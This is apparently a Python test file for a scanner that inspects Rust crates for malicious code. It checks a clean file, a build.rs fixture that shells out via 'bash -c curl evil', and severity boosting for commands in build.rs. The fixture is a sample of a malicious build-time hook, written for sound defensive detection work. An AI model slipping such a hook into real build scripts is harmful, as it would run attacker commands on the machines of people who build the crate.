"""Tests for CargoStaticAnalysisScanner."""

from app.core.config import Settings
from app.scanners.static_analysis_cargo import CargoStaticAnalysisScanner
from app.schemas.package import PackageInfo


def _make_scanner() -> CargoStaticAnalysisScanner:
    return CargoStaticAnalysisScanner(Settings())


def _make_package() -> PackageInfo:
    return PackageInfo(name="evil-crate", version="0.1.0", registry="cargo")


async def test_clean_rust_file(tmp_path):
    f = tmp_path / "lib.rs"
    f.write_text('fn main() {\n    println!("Hello, world!");\n}\n')
    result = await _make_scanner().scan(_make_package(), [f])
    assert result.verdict == "pass"


async def test_build_rs_shell_execution(tmp_path):
    f = tmp_path / "build.rs"
    f.write_text(
        'use std::process::Command;\nfn main() {\n    Command::new("bash").arg("-c").arg("curl evil").status();\n}\n'
    )
    result = await _make_scanner().scan(_make_package(), [f])
    assert result.verdict == "fail"


async def test_build_rs_severity_boost(tmp_path):
    f = tmp_path / "build.rs"
    f.write_text('use std::process::Command;\nfn main() {\n    Command::new("ls").status();\n}\n')
    result = await _make_scanner().scan(_make_package(), [f])
    # Command in build.rs gets boosted from high to critical
    matches = result.metadata.get("matches", [])
    assert any(m["severity"] == "critical" for m in matches)


